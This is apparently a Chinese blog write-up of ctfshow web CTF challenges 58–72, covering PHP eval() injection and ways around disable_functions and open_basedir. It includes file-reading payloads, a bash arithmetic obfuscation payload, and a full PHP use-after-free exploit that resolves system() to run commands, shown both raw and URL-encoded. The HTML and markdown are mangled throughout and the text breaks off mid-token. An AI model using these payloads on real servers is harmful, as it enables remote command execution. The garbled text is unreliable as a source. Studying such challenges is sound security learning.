title="&#x2F;?c&#x3D;$(($(($(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))$(($(())))))))"></a>&#x2F;?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</h2></li></ul><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>  ${<em>}&#x3D;””<br>  $((${</em>}))&#x3D;0<br>  $((~$((${<em>}))))&#x3D;-1<br>  #然后拼接初-36取反<br>  注意的${</em>}会输出上一次执行的结果<br>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web58～65</span><br><br>```php<br><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure></p><ul><li>&#96;&#96;&#96;shell<h2 id="题目提示函数-让我想起来web40"><a href="#题目提示函数-让我想起来web40" class="headerlink" title="#题目提示函数 让我想起来web40"></a>#题目提示函数 让我想起来web40</h2>#读取当前目录<br>c&#x3D;print_r(scandir(reset(localeconv())));<br>或者<br>c&#x3D;print_r(glob(“*”));<h2 id="注意这题使用HackBar传POST"><a href="#注意这题使用HackBar传POST" class="headerlink" title="注意这题使用HackBar传POST"></a>注意这题使用HackBar传POST</h2>c&#x3D;show_source(‘flag.php’);<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>### web66~<span class="hljs-number">67</span><br><br>- c=print_r(scandir(<span class="hljs-string">&quot;/&quot;</span>));<br>- c=highlight_file(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br><br>### web68～<span class="hljs-number">70</span><br><br>- ![在这里插入图片描述](https:<span class="hljs-comment">//img-blog.csdnimg.cn/814986f6418044909f16a4b960528037.png)</span><br><br>- 说明highlight_file()函数被禁用了<br><br>- 尝试发现print_r()也被禁用<br><br>- ```shell<br>  c=var_dump(scandir(<span class="hljs-string">&quot;/&quot;</span>));#打印当前目录<br>  ------------------------------------<br>  c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>  或<br>  c=require(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br>  #include和require能执行文件中的代码，因为flag不是php代码，所以只能以文本形式显示<br></code></pre></td></tr></table></figure></li></ul><h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 你们在炫技吗？</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>        <span class="hljs-variable">$c</span>= <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<span class="hljs-comment">#此函数返回输出缓冲区的内容</span><br>        <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>其他和上面一样，这次居然把数字字母给我换成❓，不让我看</p></li><li><pre><code class="shell">c=include(&#39;/flag.txt&#39;);exit(0);#截断试一下<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-comment">### web72</span><br><br>- 很痛苦这一题<br>- 在web71的基础上增加了open_basedir和disable_functions的限制<br>- open_basedir:将PHP所能打开的文件限制在指定的目录树中，包括文件本身。当程序要使用例如<span class="hljs-title function_ invoke__">fopen</span>()或<span class="hljs-title function_ invoke__">file_get_contents</span>()打开一个文件时，这个文件的位置就会被检查。当文件在指定的目录树之外，程序将拒绝打开<br>- disable_functions:用于禁止某些函数，也就是黑名单，简单来说就是php为了防止某些危险函数执行给出的配置项，默认情况下为空<br>- 下面是解法：（参考了多处WP😭，反正还是不懂，菊花已经被🫒了）<br><br>- ```shell<br>  c=<span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-keyword">exit</span>(<span class="hljs-number">0</span>);<span class="hljs-meta">?&gt;</span><br>  <span class="hljs-comment">#利用脚本找到flag存放在flag0.txt中</span><br>  <span class="hljs-comment">#glob:// 查找匹配的文件路径模式</span><br>  <br></code></pre></td></tr></table></figure></code></pre></li><li><p>&#96;&#96;&#96;php</p></li></ul><h1 id="将下面脚本url编码后发过去"><a href="#将下面脚本url编码后发过去" class="headerlink" title="将下面脚本url编码后发过去"></a>将下面脚本url编码后发过去</h1><p>  c&#x3D;function ctfshow($cmd) {<br>      global $abc, $helper, $backtrace;</p><pre><code class="hljs">  class Vuln &#123;      public $a;      public function __destruct() &#123;           global $backtrace;           unset($this-&gt;a);          $backtrace = (new Exception)-&gt;getTrace();          if(!isset($backtrace[1][&#39;args&#39;])) &#123;              $backtrace = debug_backtrace();          &#125;      &#125;  &#125;  class Helper &#123;      public $a, $b, $c, $d;  &#125;  function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;      $address = 0;      for($j = $s-1; $j &gt;= 0; $j--) &#123;          $address &lt;&lt;= 8;          $address |= ord($str[$p+$j]);      &#125;      return $address;  &#125;  function ptr2str($ptr, $m = 8) &#123;      $out = &quot;&quot;;      for ($i=0; $i &lt; $m; $i++) &#123;          $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));          $ptr &gt;&gt;= 8;      &#125;      return $out;  &#125;  function write(&amp;$str, $p, $v, $n = 8) &#123;      $i = 0;      for($i = 0; $i &lt; $n; $i++) &#123;          $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));          $v &gt;&gt;= 8;      &#125;  &#125;  function leak($addr, $p = 0, $s = 8) &#123;      global $abc, $helper;      write($abc, 0x68, $addr + $p - 0x10);      $leak = strlen($helper-&gt;a);      if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;      return $leak;  &#125;  function parse_elf($base) &#123;      $e_type = leak($base, 0x10, 2);      $e_phoff = leak($base, 0x20);      $e_phentsize = leak($base, 0x36, 2);      $e_phnum = leak($base, 0x38, 2);      for($i = 0; $i &lt; $e_phnum; $i++) &#123;          $header = $base + $e_phoff + $i * $e_phentsize;          $p_type  = leak($header, 0, 4);          $p_flags = leak($header, 4, 4);          $p_vaddr = leak($header, 0x10);          $p_memsz = leak($header, 0x28);          if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;               $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;              $data_size = $p_memsz;          &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;               $text_size = $p_memsz;          &#125;      &#125;      if(!$data_addr || !$text_size || !$data_size)          return false;      return [$data_addr, $text_size, $data_size];  &#125;  function get_basic_funcs($base, $elf) &#123;      list($data_addr, $text_size, $data_size) = $elf;      for($i = 0; $i &lt; $data_size / 8; $i++) &#123;          $leak = leak($data_addr, $i * 8);          if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;              $deref = leak($leak);                            if($deref != 0x746e6174736e6f63)                  continue;          &#125; else continue;          $leak = leak($data_addr, ($i + 4) * 8);          if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;              $deref = leak($leak);                            if($deref != 0x786568326e6962)                  continue;          &#125; else continue;          return $data_addr + $i * 8;      &#125;  &#125;  function get_binary_base($binary_leak) &#123;      $base = 0;      $start = $binary_leak &amp; 0xfffffffffffff000;      for($i = 0; $i &lt; 0x1000; $i++) &#123;          $addr = $start - 0x1000 * $i;          $leak = leak($addr, 0, 7);          if($leak == 0x10102464c457f) &#123;              return $addr;          &#125;      &#125;  &#125;  function get_system($basic_funcs) &#123;      $addr = $basic_funcs;      do &#123;          $f_entry = leak($addr);          $f_name = leak($f_entry, 0, 6);          if($f_name == 0x6d6574737973) &#123;              return leak($addr + 8);          &#125;          $addr += 0x20;      &#125; while($f_entry != 0);      return false;  &#125;  function trigger_uaf($arg) &#123;      $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);      $vuln = new Vuln();      $vuln-&gt;a = $arg;  &#125;  if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;      die(&#39;This PoC is for *nix systems only.&#39;);  &#125;  $n_alloc = 10;   $contiguous = [];  for($i = 0; $i &lt; $n_alloc; $i++)      $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);  trigger_uaf(&#39;x&#39;);  $abc = $backtrace[1][&#39;args&#39;][0];  $helper = new Helper;  $helper-&gt;b = function ($x) &#123; &#125;;  if(strlen($abc) == 79 || strlen($abc) == 0) &#123;      die(&quot;UAF failed&quot;);  &#125;  $closure_handlers = str2ptr($abc, 0);  $php_heap = str2ptr($abc, 0x58);  $abc_addr = $php_heap - 0xc8;  write($abc, 0x60, 2);  write($abc, 0x70, 6);  write($abc, 0x10, $abc_addr + 0x60);  write($abc, 0x18, 0xa);  $closure_obj = str2ptr($abc, 0x20);  $binary_leak = leak($closure_handlers, 8);  if(!($base = get_binary_base($binary_leak))) &#123;      die(&quot;Couldn&#39;t determine binary base address&quot;);  &#125;  if(!($elf = parse_elf($base))) &#123;      die(&quot;Couldn&#39;t parse ELF header&quot;);  &#125;  if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;      die(&quot;Couldn&#39;t get basic_functions address&quot;);  &#125;  if(!($zif_system = get_system($basic_funcs))) &#123;      die(&quot;Couldn&#39;t get zif_system address&quot;);  &#125;  $fake_obj_offset = 0xd0;  for($i = 0; $i &lt; 0x110; $i += 8) &#123;      write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));  &#125;  write($abc, 0x20, $abc_addr + $fake_obj_offset);  write($abc, 0xd0 + 0x38, 1, 4);   write($abc, 0xd0 + 0x68, $zif_system);   ($helper-&gt;b)($cmd);  exit();</code></pre><p>  }</p><p>  ctfshow(“cat &#x2F;flag0.txt”);ob_end_flush();</p>  <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><br>- ```shell<br>  # 编码后的payload<br>  <span class="hljs-keyword">c</span><span class="hljs-operator">=</span>function<span class="hljs-variable">%20</span>ctfshow(<span class="hljs-variable">%24</span>cmd)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-keyword">global</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>abc<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>helper<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>backtrace<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>class<span class="hljs-variable">%20</span>vuln<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>public<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>a<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>public<span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>__destruct()<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-keyword">global</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>backtrace<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>unset(<span class="hljs-variable">%24</span>this-<span class="hljs-variable">%3</span>ea)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>backtrace<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>(new<span class="hljs-variable">%20</span>exception)-<span class="hljs-variable">%3</span>egettrace()<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>if(<span class="hljs-title">!isset</span>(<span class="hljs-variable">%24</span>backtrace<span class="hljs-variable">%5</span>b<span class="hljs-number">1</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%5</span>b&#x27;args&#x27;<span class="hljs-variable">%5</span>d))<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>backtrace<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>debug_backtrace()<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>class<span class="hljs-variable">%20</span>helper<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>public<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>a<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>b<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>d<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>str<span class="hljs-number">2</span>ptr(<span class="hljs-variable">%26</span><span class="hljs-variable">%24</span>str<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>p<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>s<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>address<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for(<span class="hljs-variable">%24</span>j<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>s<span class="hljs-number">-1</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>j<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%3</span>d<span class="hljs-variable">%200</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>j--)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>address<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>address<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span><span class="hljs-keyword">c</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-keyword">ord</span>(<span class="hljs-variable">%24</span>str<span class="hljs-variable">%5</span>b<span class="hljs-variable">%24</span>p<span class="hljs-variable">%2</span>b<span class="hljs-variable">%24</span>j<span class="hljs-variable">%5</span>d)<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>address<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>function<span class="hljs-variable">%20</span>ptr<span class="hljs-number">2</span>str(<span class="hljs-variable">%24</span>ptr<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>m<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span>)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>out<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>for<span class="hljs-variable">%20</span>(<span class="hljs-variable">%24</span>i<span class="hljs-variable">%3</span>d<span class="hljs-number">0</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>m<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>i<span class="hljs-variable">%2</span>b<span class="hljs-variable">%2</span>b)<span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>out<span class="hljs-variable">%20</span>.<span class="hljs-variable">%3</span>d<span class="hljs-variable">%20</span>sprintf(<span class="hljs-variable">%22</span><span class="hljs-variable">%25</span><span class="hljs-keyword">c</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span>(<span class="hljs-variable">%24</span>ptr<span class="hljs-variable">%20</span><span class="hljs-variable">%26</span><span class="hljs-variable">%200</span>xff))<span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>ptr<span class="hljs-variable">%20</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%3</span>e<span class="hljs-variable">%3</span>d<span class="hljs-variable">%208</span><span class="hljs-variable">%3</span>b<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%7</span>d<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span>return<span class="hljs-variable">%20</span><span class="hljs-variable">%24</span>out<span 